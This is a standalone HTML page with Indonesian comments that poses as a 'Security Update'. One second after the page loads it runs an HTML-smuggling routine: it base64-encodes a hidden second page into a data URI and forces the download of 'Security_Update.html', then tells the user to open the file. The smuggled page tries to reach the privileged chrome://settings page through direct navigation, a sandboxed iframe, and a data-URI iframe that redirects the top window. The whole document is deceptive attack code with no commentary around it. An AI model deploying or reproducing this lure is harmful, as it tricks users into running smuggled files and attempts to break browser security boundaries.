<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; text-align: center; padding-top: 20vh; }
  iframe { display: none; }
</style>
</head>
<body>

<h1>🔒 Security Update</h1>
<p id="status">Menyiapkan file pembaruan...</p>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. PAYLOAD INTERNAL BYPASS (DISELUNDUPKAN)
  // ============================================
  var smuggledHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>System Bypass</title></head>
    <body style="background:#000;color:#fff;font-family:monospace;text-align:center;padding-top:20vh;">
      <h1>Executing Internal Bypass...</h1>
      <p id="log">Memulai...</p>
      <script>
        (function() {
          var logEl = document.getElementById('log');
          function log(msg) { logEl.innerHTML += "<br>> " + msg; console.log(msg); }

          var internalUrl = "chrome://settings";

          log("Memulai bypass TANPA Blob URL");

          // A. Direct Navigation (Mungkin diizinkan di file://)
          setTimeout(function() {
            try {
              window.location.href = internalUrl;
              log("Direct Navigation sent.");
            } catch(e) { log("Direct fail: " + e.message); }
          }, 1000);

          // B. Iframe Sandbox
          setTimeout(function() {
            var iframe = document.createElement('iframe');
            iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
            iframe.src = internalUrl;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
            log("Iframe Sandbox sent.");
          }, 2000);

          // C. DATA URI WRAPPER (Pengganti Blob)
          setTimeout(function() {
            try {
              var dataUri = "data:text/html;base64," + btoa('<script>window.top.location.href="' + internalUrl + '";<\\/script>');
              
              var iframe2 = document.createElement('iframe');
              iframe2.src = dataUri;
              iframe2.style.display = "none";
              document.body.appendChild(iframe2);
              log("Data URI Wrapper sent.");
            } catch(e) { log("Data URI error: " + e.message); }
          }, 3000);

        })();
      <\/script>
    </body>
    </html>
  `;

  // ============================================
  // 2. FUNGSI HTML SMUGGLING (DATA URI ENCODE)
  // ============================================
  function triggerSmuggling() {
    statusEl.innerText = "Merakit payload di memori...";

    try {
      // Encode payload HTML ke Base64
      var base64Payload = btoa(unescape(encodeURIComponent(smuggledHTML)));
      
      // Buat Data URI (Bukan Blob URL)
      var dataUri = "data:text/html;base64," + base64Payload;

      // Trigger Download via Anchor (Data URI)
      var a = document.createElement('a');
      a.href = dataUri;
      a.download = 'Security_Update.html'; 
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      statusEl.innerText = "File berhasil diunduh. Silakan buka file tersebut.";

      setTimeout(function() {
        document.body.removeChild(a);
      }, 5000);

    } catch (e) {
      statusEl.innerText = "Gagal: " + e.message;
    }
  }

  // ============================================
  // 3. EKSEKUSI (ZERO-CLICK)
  // ============================================
  setTimeout(triggerSmuggling, 1000);

})();
</script>
</body>
</html>
